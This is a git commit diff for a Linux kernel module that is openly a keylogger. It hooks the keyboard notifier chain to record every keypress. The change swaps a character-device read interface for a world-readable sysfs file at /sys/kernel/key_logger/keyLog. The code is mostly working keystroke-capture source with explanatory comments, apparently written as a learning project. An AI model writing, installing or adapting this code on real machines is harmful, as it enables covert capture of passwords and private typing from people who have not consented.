da5584955de254e1f834ecb2ab188dc02dfb3253
yo0x <6yonor@gmail.com>
2021-07-08 18:49:24 +0000

    ilona fixed

--- module/knk-yi.c
+++ module/knk-yi.c
@@ -4,59 +4,48 @@
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
 #include <linux/fs.h>
-#include <linux/cdev.h>
 #include <linux/uaccess.h>
 #include <linux/notifier.h>
 
-#define DEVICE_NAME "key_log"  // the name of this device
-
-/*global variables*/
-int major_num=0;
-int minor_num=0;
+//#define DEVICE_NAME "key_log"  // the name of this device
 
 
-struct cdev cdev;/*char device structure*/
-dev_t dev = 0;
+
 
 // Keylogger Info
 #define BUFFER_LEN 1024
 static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys/..
 static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
 int buf_pos = 0;  // Counting characters to avoid overflow
+int keyLog;
+static struct kobject *keyLog_obj;
 
-/*parameters of the module-->without permissions*/
-module_param(major_num,int,0);
-module_param(minor_num,int,0);
+
 
 // Prototypes
 void keylog_exit(void);
-static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
+static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf); 
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
 
 
-
-
-
-/*connect our function to the function pointer in fops struct
- *Setting the Device Driver read function
- * */
-
- //connect our function to it function pointer in fops struct
-struct file_operations fops = {
-	.owner = THIS_MODULE,
-	.read = dev_read
-	};
-
-
-// Initializing the notifier_block
-static struct notifier_block nb = {
-	.notifier_call = keys_pressed
-}; 
-
-
-static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
-	struct keyboard_notifier_param *param = data;
+/*like read function return length of buffer. */
+static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
+{
 	
+	int len = strlen(keys_buffer);
+	//int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
+	memcpy(buf,keys_buffer,BUFFER_LEN);//copy to buf from keeys_buffer
+	
+	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
+	keys_bf_ptr = keys_buffer; // Reset buffer pointer
+	return len;
+	
+}
+
+/***********************************************************************************/
+static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
+	
+	struct keyboard_notifier_param *param = data;
 	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
 	if (action == KBD_KEYSYM && param->down) {
 		char c = param->value;
@@ -84,71 +73,100 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 }
 
 
-// Device driver read function
-static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) 
-{
+
+
+/*Initializing the notifier_block
+ * The notifier data structure is a simple linked list of function pointers.
+ *  The function pointers are registered with ‘functions’ that are to be called when an event occurs. Each module needs to maintain a notifier list. 
+ * The functions are registered to this notification list.
+ * */
+static struct notifier_block nb = {
+	.notifier_call = keys_pressed
+}; 
+
+
+
+
+/*initialize the struct kobject_attribute (By value)*/
+static struct kobj_attribute keyLog_attr = {
+	.attr = {.name = "keyLog" ,
+			 .mode = 0644,
+			},
+	.show = keyLog_show
+	};
 	
-	int len = strlen(keys_buffer);
-	int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
-	if (ret) 
-	{
-		printk(KERN_INFO "Couldn't copy all data to user space\n");
-		return ret;
-	}
-	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
-	keys_bf_ptr = keys_buffer; // Reset buffer pointer
-	return len;
-}
-
-
-
-
-
 	
-
-void my_setup_keydev(void)
-{
-	int res=0;
-	cdev_init(&cdev, &fops);/*initialize cdev & connect to char_fops*/
-	cdev.owner = THIS_MODULE;
-	res = cdev_add(&cdev,dev,1);
-	if(res)
-	{
-		printk(KERN_NOTICE "Error adding char device res = %d\n" , res);
-	}
-}
+/*Declare an array of this structures ,represent the file.*/
+static struct attribute *attrs[] = {
+	&keyLog_attr.attr,
+	NULL,	
+};
 
 
+
+/*To group those attributes. without this struct we cant use sysfs_create_group!
+ * we insert *attrs[] to this struct.
+ * An unnamed attribute group will put all of the attributes directly in
+ * the kobject directory.  If we specify a name, a subdirectory will be
+ * created for the attributes with the directory being the name of the
+ * attribute group.
+ */
+static struct attribute_group attr_group = {
+	.attrs = attrs,
+};
+
+
+/*keylog_init() : create kobject("key_logger") and the variable keylog.*/
 static int __init keylog_init(void)
 {
-	int err=0;
-	err=alloc_chrdev_region(&dev,minor_num,1,THIS_MODULE->name);/*kernel allocate a major num on the fly */
-	if(err<0)
-	{
-		printk(KERN_INFO "iinit_module() : ALLOC FSILURE %d\n" ,major_num );
-		keylog_exit();
-		return err;
-		
-	}
-	my_setup_keydev();
-	major_num=MAJOR(dev);/*obtain the 12 bits for the major number*/
 	
-	printk(KERN_WARNING "init_module() : the o.s gave us major number = %d\n",major_num);
-	printk(KERN_INFO "create node with mknod key_log c %d 0\n",major_num);
-	
-	
-	register_keyboard_notifier(&nb);
-	memset(keys_buffer, 0, BUFFER_LEN);
-	return 0 ; /*if sucsses rerurn 0*/
+int err;
 
-	
+/*create a struct kobject dynamically
+ * increments refcount and register it eith sysfs
+ * name of this kobjeck : "key_logger" , parent of this kobject : kernel_kobject
+ * This kobkect will be in : /sys/kernel
+ * MUST --> when we will finish withe this structure we need to call kobject_put()*/
+keyLog_obj = kobject_create_and_add("key_logger", kernel_kobj);
+
+/*If the kobject was not able to be created*/
+if (!keyLog_obj)
+		return -ENOMEM;
+		
+/*This function creates a group for the first time. It will explicitly warn and error if any of the attribute files being created already exist.
+ * Returns 0 on success or error.
+ * All files are bound together in struct attribute *attrs[]  , 
+ * this function get Struct attribute_group and that is why we use struct attribute_group. 
+ * sysfs_creare_group --> kobject : keyLog_obj , struct attribute_group : attr_group */	
+err = sysfs_create_group(keyLog_obj, &attr_group);
+
+/*Returns 0 on success*/
+if (err)
+	kobject_put(keyLog_obj);//decrement refcount for kobject. when refcount == 0 -> call Kobject_cleanup() through kobject_release()
+							//call kobject_put and the structure will be dynamically freed when it is no longer being used.
+						
+printk(KERN_INFO "keylog_init() : key_Logger Created successfully");
+
+/***********************************/								
+register_keyboard_notifier(&nb);
+
+
+/*memset(...)-->used to fill a block of memory with a particular value. initialize the keys_buffer
+ * keys_buffer -> Starting address of memory to be filled
+ * 0 - > The string to be copied
+ * BUFFER_LEN -> number of bytes to be copied
+ * */
+memset(keys_buffer, 0, BUFFER_LEN);
+
+
+//printk(KERN_INFO "%s\n",keys_buffer);
+return 0;
 }
 
 
  void keylog_exit(void)
 {
-
-	unregister_chrdev_region(major_num,1);
+	kobject_put(keyLog_obj);
 	unregister_keyboard_notifier(&nb);
 	printk(KERN_NOTICE "Keylogger unregister\n");
 	printk(KERN_NOTICE "Keylogger module unloaded\n");
